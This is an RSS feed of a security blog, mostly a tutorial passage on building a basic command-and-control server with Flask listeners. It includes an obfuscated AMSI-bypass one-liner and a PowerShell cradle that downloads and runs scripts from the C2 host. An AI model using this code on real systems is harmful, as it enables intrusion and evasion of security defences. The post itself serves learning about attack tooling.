<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>0xRick</title>
    <link>https://0xrick.github.io/</link>
    
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Thu, 16 Apr 2020 13:57:30 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Categories</title>
      <link>https://0xrick.github.io/c/categories/</link>
      <guid>https://0xrick.github.io/c/categories/</guid>
      <pubDate>Thu, 16 Apr 2020 13:57:30 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;Categories&quot;&gt;&lt;a href=&quot;#Categories&quot; class=&quot;headerlink&quot; title=&quot;Categories&quot;&gt;&lt;/a&gt;Categories&lt;/h1&gt;&lt;h2 id=&quot;Hack-The-Box&quot;&gt;&lt;a href=&quot;#Hack-The-
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box"><a href="#Hack-The-Box" class="headerlink" title="Hack The Box"></a>Hack The Box</h2><ul><li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li><li><a href="/hack-the-box/player/">Hack The Box - Player</a></li><li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li><li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li><li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li><li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li><li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li><li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li><li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li><li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li><li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li><li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li><li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li><li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li><li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li><li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li><li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li><li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li><li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li><li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li><li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li><li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li><li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li><li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li><li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li><li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li><li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li><li><a href="/hack-the-box/friendzone/">Hack The Box - Friendzone</a></li><li><a href="/hack-the-box/hackback/">Hack The Box - Hackback</a></li><li><a href="/hack-the-box/netmon/">Hack The Box - Netmon</a></li><li><a href="/hack-the-box/querier/">Hack The Box - Querier</a></li><li><a href="/hack-the-box/querier-2/">Hack The Box - Querier (Commando)</a></li><li><a href="/hack-the-box/flujab/">Hack The Box - FluJab</a></li><li><a href="/hack-the-box/help/">Hack The Box - Help</a></li><li><a href="/hack-the-box/sizzle/">Hack The Box - Sizzle</a></li><li><a href="/hack-the-box/chaos/">Hack The Box - Chaos</a></li><li><a href="/hack-the-box/conceal/">Hack The Box - Conceal</a></li><li><a href="/hack-the-box/lightweight/">Hack The Box - Lightweight</a></li><li><a href="/hack-the-box/bighead/">Hack The Box - Bighead</a></li><li><a href="/hack-the-box/irked/">Hack The Box - Irked</a></li><li><a href="/hack-the-box/teacher/">Hack The Box - Teacher</a></li><li><a href="/hack-the-box/redcross/">Hack The Box - RedCross</a></li><li><a href="/hack-the-box/vault/">Hack The Box - Vault</a></li><li><a href="/hack-the-box/curling/">Hack The Box - Curling</a></li><li><a href="/hack-the-box/frolic/">Hack The Box - Frolic</a></li><li><a href="/hack-the-box/carrier/">Hack The Box - Carrier</a></li><li><a href="/hack-the-box/ethereal/">Hack The Box - Ethereal</a></li><li><a href="/hack-the-box/access/">Hack The Box - Access</a></li><li><a href="/hack-the-box/zipper/">Hack The Box - Zipper</a></li><li><a href="/hack-the-box/giddy/">Hack The Box - Giddy</a></li><li><a href="/hack-the-box/ypuffy/">Hack The Box - Ypuffy</a></li><li><a href="/hack-the-box/dab/">Hack The Box - Dab</a></li><li><a href="/hack-the-box/secnotes/">Hack The Box - SecNotes</a></li><li><a href="/hack-the-box/oz/">Hack The Box - Oz</a></li><li><a href="/hack-the-box/waldo/">Hack The Box - Waldo</a></li><li><a href="/hack-the-box/active/">Hack The Box - Active</a></li><li><a href="/hack-the-box/hawk/">Hack The Box - Hawk</a></li><li><a href="/hack-the-box/jerry">Hack The Box - Jerry</a></li></ul><h2 id="Wizard-Labs"><a href="#Wizard-Labs" class="headerlink" title="Wizard Labs"></a>Wizard Labs</h2><ul><li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li><li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li></ul><h2 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h2><ul><li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li><li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li><li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li><li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li><li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li><li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li></ul><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><ul><li><a href="/pwn/collision/">pwnable.kr - collision</a></li><li><a href="/pwn/bof/">pwnable.kr - bof</a></li><li><a href="/pwn/fd/">pwnable.kr - fd</a></li></ul><h2 id="CTFs"><a href="#CTFs" class="headerlink" title="CTFs"></a>CTFs</h2><ul><li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li></ul><h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul><li><a href="/lists/stego/">Steganography</a></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul><li><a href="/misc/c2/">Building a Basic C2</a></li></ul>]]></content:encoded>
      
      <comments>https://0xrick.github.io/c/categories/#disqus_thread</comments>
    </item>
    
    <item>
      <title>home</title>
      <link>https://0xrick.github.io/uncategorized/home/</link>
      <guid>https://0xrick.github.io/uncategorized/home/</guid>
      <pubDate>Thu, 16 Apr 2020 01:56:30 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;Recent-Articles&quot;&gt;&lt;a href=&quot;#Recent-Articles&quot; class=&quot;headerlink&quot; title=&quot;Recent Articles&quot;&gt;&lt;/a&gt;Recent Articles&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;/mi
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="Recent-Articles"><a href="#Recent-Articles" class="headerlink" title="Recent Articles"></a>Recent Articles</h2><ul><li><a href="/misc/c2/">Building a Basic C2</a></li><li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li><li><a href="/hack-the-box/player/">Hack The Box - Player</a></li><li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li></ul><hr><h2 id="About-me"><a href="#About-me" class="headerlink" title="About me"></a>About me</h2><p><strong>Ahmed Hesham</strong> aka <strong>0xRick</strong> | Pentester / Red Teamer wannabe.<br><a href="mailto:x0rick@protonmail.com">x0rick@protonmail.com</a><br><img src="https://www.hackthebox.eu/badge/image/65598" id="htbbadge"> <br><br></p><h2 id="About-the-blog"><a href="#About-the-blog" class="headerlink" title="About the blog"></a>About the blog</h2><p>I enjoy hacking stuff as much as I enjoy writing about it. So here you can find write-ups for CTF challenges, articles about certain topics and even quick notes about different things that I want to remember.</p><p>Goals:</p><ul><li>Document what I learn.</li><li>Share knowledge that might help others.</li></ul><p><a href="https://github.com/0xRick/CTF-scripts" target="_blank" rel="noopener"><strong>Scripts repository</strong></a></p><h2 id="Social"><a href="#Social" class="headerlink" title="Social"></a>Social</h2><p><a href="https://twitter.com/Ahm3d_H3sham?ref_src=twsrc%5Etfw" target="_blank" rel="noopener" class="twitter-follow-button" data-show-count="false">Follow @Ahm3d_H3sham</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><br><a class="twitter-timeline" data-width="600" data-height="700" data-theme="light" href="https://twitter.com/Ahm3d_H3sham?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">Tweets by Ahm3d_H3sham</a> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/uncategorized/home/#disqus_thread</comments>
    </item>
    
    <item>
      <title>menu</title>
      <link>https://0xrick.github.io/uncategorized/menu/</link>
      <guid>https://0xrick.github.io/uncategorized/menu/</guid>
      <pubDate>Thu, 16 Apr 2020 01:55:55 GMT</pubDate>
      <description>
      
        
        
          &lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Categories&quot;&gt;&lt;a href=&quot;#Categories&quot; class=&quot;headerlink&quot; title=&quot;Categories&quot;&gt;&lt;/a&gt;Categories&lt;/h1&gt;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<ul><li><a href="/">Home</a></li></ul><h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul><li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li><li><a href="/hack-the-box/player/">Hack The Box - Player</a></li><li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li><li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li><li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li><li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li><li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li><li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li><li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li><li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li><li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li><li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li><li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li><li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li><li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li><li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li><li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li><li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li><li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li><li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li><li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li><li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li><li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li><li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li><li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li><li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li><li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li><li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li></ul><h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul><li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li><li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li></ul><h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul><li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li><li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li><li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li><li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li><li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li><li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li></ul><h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul><li><a href="/pwn/collision/">pwnable.kr - collision</a></li><li><a href="/pwn/bof/">pwnable.kr - bof</a></li><li><a href="/pwn/fd/">pwnable.kr - fd</a></li></ul><h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul><li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li></ul><h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul><li><a href="/lists/stego/">Steganography</a></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul><li><a href="/misc/c2">Building a Basic C2</a></li></ul>]]></content:encoded>
      
      <comments>https://0xrick.github.io/uncategorized/menu/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Building a Basic C2</title>
      <link>https://0xrick.github.io/misc/c2/</link>
      <guid>https://0xrick.github.io/misc/c2/</guid>
      <pubDate>Wed, 15 Apr 2020 23:00:00 GMT</pubDate>
      <description>
      
        In this post I talk about the approaches I took trying to build a basic C2.
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>It’s very common that after successful exploitation an attacker would put an agent that maintains communication with a c2 server on the compromised system, and the reason for that is very simple, having an agent that provides persistency over large periods and almost all the capabilities an attacker would need to perform lateral movement and other post-exploitation actions is better than having a reverse shell for example. There are a lot of free open source post-exploitation toolsets that provide this kind of capability, like <a href="https://www.metasploit.com/" target="_blank" rel="noopener">Metasploit</a>, <a href="https://www.powershellempire.com/" target="_blank" rel="noopener">Empire</a> and many others, and even if you only play CTFs it’s most likely that you have used one of those before.</p><p>Long story short, I only had a general idea about how these tools work and I wanted to understand the internals of them, so I decided to try and build one on my own. For the last three weeks, I have been searching and coding, and I came up with a very basic implementation of a c2 server and an agent. In this blog post I’m going to explain the approaches I took to build the different pieces of the tool.</p><p>Please keep in mind that some of these approaches might not be the best and also the code might be kind of messy, If you have any suggestions for improvements feel free to contact me, I’d like to know what better approaches I could take. I also like to point out that this is not a tool to be used in real engagements, besides only doing basic actions like executing <code>cmd</code> and <code>powershell</code>, I didn’t take in consideration any opsec precautions.</p><p>This tool is still a work in progress, I finished the base but I’m still going to add more execution methods and more capabilities to the agent. After adding new features I will keep writing posts similar to this one, so that people with more experience give feedback and suggest improvements, while people with less experience learn.</p><p>You can find the tool on <a href="https://github.com/0xRick/c2" target="_blank" rel="noopener">github</a>.</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><h3 id="About-c2-servers-agents"><a href="#About-c2-servers-agents" class="headerlink" title="About c2 servers / agents"></a>About c2 servers / agents</h3><p>As far as I know,</p><p>A basic c2 server should be able to:</p><ul><li>Start and stop listeners.</li><li>Generate payloads.</li><li>Handle agents and task them to do stuff.</li></ul><p>An agent should be able to:</p><ul><li>Download and execute its tasks.</li><li>Send results.</li><li>Persist.</li></ul><p>A listener should be able to:</p><ul><li>Handle multiple agents.</li><li>Host files.</li></ul><p>And all communications should be encrypted.</p><h3 id="About-the-Tool"><a href="#About-the-Tool" class="headerlink" title="About the Tool"></a>About the Tool</h3><p>The server itself is written in <code>python3</code>, I wrote two agents, one in <code>c++</code> and the other in <code>powershell</code>, listeners are <code>http</code> listeners.</p><p>I couldn’t come up with a nice name so I would appreciate suggestions.</p><h2 id="Listeners"><a href="#Listeners" class="headerlink" title="Listeners"></a>Listeners</h2><h3 id="Basic-Info"><a href="#Basic-Info" class="headerlink" title="Basic Info"></a>Basic Info</h3><p>Listeners are the core functionality of the server because they provide the way of communication between the server and the agents. I decided to use <code>http</code> listeners, and I used <code>flask</code> to create the listener application.</p><p>A <code>Listener</code> object is instantiated with a name, a port and an <code>IP</code> address to bind to:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listener</span>:</span>    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, port, ipaddress)</span>:</span></span><br><span class="line">        </span><br><span class="line">        self.name       = name</span><br><span class="line">        self.port       = port</span><br><span class="line">        self.ipaddress  = ipaddress</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>Then it creates the needed directories to store files, and other data like the encryption key and agents’ data:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    </span><br><span class="line">self.Path       = <span class="string">"data/listeners/&#123;&#125;/"</span>.format(self.name)</span><br><span class="line">self.keyPath    = <span class="string">"&#123;&#125;key"</span>.format(self.Path)</span><br><span class="line">self.filePath   = <span class="string">"&#123;&#125;files/"</span>.format(self.Path)</span><br><span class="line">self.agentsPath = <span class="string">"&#123;&#125;agents/"</span>.format(self.Path)</span><br><span class="line">        </span><br><span class="line">...</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> os.path.exists(self.Path) == <span class="literal">False</span>:</span><br><span class="line">    os.mkdir(self.Path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(self.agentsPath) == <span class="literal">False</span>:</span><br><span class="line">    os.mkdir(self.agentsPath)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(self.filePath) == <span class="literal">False</span>:</span><br><span class="line">    os.mkdir(self.filePath)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>After that it creates a key, saves it and stores it in a variable (more on <code>generateKey()</code> in the encryption part):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> os.path.exists(self.keyPath) == <span class="literal">False</span>:</span><br><span class="line">    </span><br><span class="line">    key      = generateKey()</span><br><span class="line">    self.key = key</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(self.keyPath, <span class="string">"wt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(key)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">with</span> open(self.keyPath, <span class="string">"rt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        self.key = f.read()</span><br><span class="line">            </span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="The-Flask-Application"><a href="#The-Flask-Application" class="headerlink" title="The Flask Application"></a>The Flask Application</h3><p>The flask application which provides all the functionality of the listener has 5 routes: <code>/reg</code>, <code>/tasks/&lt;name&gt;</code>, <code>/results/&lt;name&gt;</code>, <code>/download/&lt;name&gt;</code>, <code>/sc/&lt;name&gt;</code>.</p><h4 id="reg"><a href="#reg" class="headerlink" title="/reg"></a><code>/reg</code></h4><p><code>/reg</code> is responsible for handling new agents, it only accepts <code>POST</code> requests and it takes two parameters: <code>name</code> and <code>type</code>. <code>name</code> is for the <code>hostname</code> while  <code>type</code> is for the agent’s type.</p><p>When it receives a new request it creates a random string of 6 uppercase letters as the new agent’s name (that name can be changed later), then it takes the <code>hostname</code> and the agent’s type from the request parameters. It also saves the remote address of the request which is the <code>IP</code> address of the compromised host.</p><p>With these information it creates a new <code>Agent</code> object and saves it to the agents database, and finally it responds with the generated random name so that the agent on the other side can know its name.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@self.app.route("/reg", methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">registerAgent</span><span class="params">()</span>:</span></span><br><span class="line">    name     = <span class="string">''</span>.join(choice(ascii_uppercase) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>))</span><br><span class="line">    remoteip = flask.request.remote_addr</span><br><span class="line">    hostname = flask.request.form.get(<span class="string">"name"</span>)</span><br><span class="line">    Type     = flask.request.form.get(<span class="string">"type"</span>)</span><br><span class="line">    success(<span class="string">"Agent &#123;&#125; checked in."</span>.format(name))</span><br><span class="line">    writeToDatabase(agentsDB, Agent(name, self.name, remoteip, hostname, Type, self.key))</span><br><span class="line">    <span class="keyword">return</span> (name, <span class="number">200</span>)</span><br></pre></td></tr></table></figure><h4 id="tasks-lt-name-gt"><a href="#tasks-lt-name-gt" class="headerlink" title="/tasks/&lt;name&gt;"></a><code>/tasks/&lt;name&gt;</code></h4><p><code>/tasks/&lt;name&gt;</code> is the endpoint that agents request to download their tasks, <code>&lt;name&gt;</code> is a placeholder for the agent’s name, it only accepts <code>GET</code> requests.</p><p>It simply checks if there are new tasks (by checking if the tasks file exists), if there are new tasks it responds with the tasks, otherwise it sends an empty response (<code>204</code>).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@self.app.route("/tasks/&lt;name&gt;", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serveTasks</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">"&#123;&#125;/&#123;&#125;/tasks"</span>.format(self.agentsPath, name)):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"&#123;&#125;&#123;&#125;/tasks"</span>.format(self.agentsPath, name), <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            task = f.read()</span><br><span class="line">            clearAgentTasks(name)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span>(task,<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">''</span>,<span class="number">204</span>)</span><br></pre></td></tr></table></figure><h4 id="results-lt-name-gt"><a href="#results-lt-name-gt" class="headerlink" title="/results/&lt;name&gt;"></a><code>/results/&lt;name&gt;</code></h4><p><code>/results/&lt;name&gt;</code> is the endpoint that agents request to send results, <code>&lt;name&gt;</code> is a placeholder for the agent’s name, it only accepts <code>POST</code> requests and it takes one parameter: <code>result</code> for the results.</p><p>It takes the results and sends them to a function called <code>displayResults()</code> (more on that function in the agent handler part), then it sends an empty response <code>204</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@self.app.route("/results/&lt;name&gt;", methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receiveResults</span><span class="params">(name)</span>:</span></span><br><span class="line">    result = flask.request.form.get(<span class="string">"result"</span>)</span><br><span class="line">    displayResults(name, result)</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">''</span>,<span class="number">204</span>)</span><br></pre></td></tr></table></figure><h4 id="download-lt-name-gt"><a href="#download-lt-name-gt" class="headerlink" title="/download/&lt;name&gt;"></a><code>/download/&lt;name&gt;</code></h4><p><code>/download/&lt;name&gt;</code> is responsible for downloading files, <code>&lt;name&gt;</code> is a placeholder for the file name, it only accepts <code>GET</code> requests.</p><p>It reads the requested file from the files path and it sends it.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@self.app.route("/download/&lt;name&gt;", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendFile</span><span class="params">(name)</span>:</span></span><br><span class="line">    f    = open(<span class="string">"&#123;&#125;&#123;&#125;"</span>.format(self.filePath, name), <span class="string">"rt"</span>)</span><br><span class="line">    data = f.read()</span><br><span class="line">            </span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> (data, <span class="number">200</span>)</span><br></pre></td></tr></table></figure><h4 id="sc-lt-name-gt"><a href="#sc-lt-name-gt" class="headerlink" title="/sc/&lt;name&gt;"></a><code>/sc/&lt;name&gt;</code></h4><p><code>/sc/&lt;name&gt;</code> is just a wrapper around the <code>/download/&lt;name&gt;</code> endpoint for <code>powershell</code> scripts, it responds with a download cradle prepended with a oneliner to bypass <code>AMSI</code>, the oneliner downloads the original script from <code>/download/&lt;name&gt;</code> ,  <code>&lt;name&gt;</code> is a placeholder for the script name, it only accepts <code>GET</code> requests.</p><p>It takes the script name, creates a download cradle in the following format:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://IP:PORT/download/SCRIPT_NAME'</span>)</span><br></pre></td></tr></table></figure><p>and prepends that with the oneliner and responds with the full line.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@self.app.route("/sc/&lt;name&gt;", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendScript</span><span class="params">(name)</span>:</span></span><br><span class="line">    amsi     = <span class="string">"sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](\"&#123;1&#125;&#123;0&#125;\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"&#123;6&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;\" -f'Util','A','Amsi','.Management.','utomation.','s','System' )).\"g`etf`iElD\"( ( \"&#123;0&#125;&#123;2&#125;&#123;1&#125;\" -f'amsi','d','InitFaile' ),(\"&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"($&#123;n`ULl&#125;,$&#123;t`RuE&#125; ); "</span></span><br><span class="line">    oneliner = <span class="string">"&#123;&#125;IEX(New-Object Net.WebClient).DownloadString(\'http://&#123;&#125;:&#123;&#125;/download/&#123;&#125;\')"</span>.format(amsi,self.ipaddress,str(self.port),name)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (oneliner, <span class="number">200</span>)</span><br></pre></td></tr></table></figure><h3 id="Starting-and-Stopping"><a href="#Starting-and-Stopping" class="headerlink" title="Starting and Stopping"></a>Starting and Stopping</h3><p>I had to start listeners in threads, however <code>flask</code> applications don’t provide a reliable way to stop the application once started, the only way was to kill the process, but killing threads wasn’t also so easy, so what I did was creating a <code>Process</code> object for the function that starts the application, and a thread that starts that process which means that terminating the process would kill the thread and stop the application.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 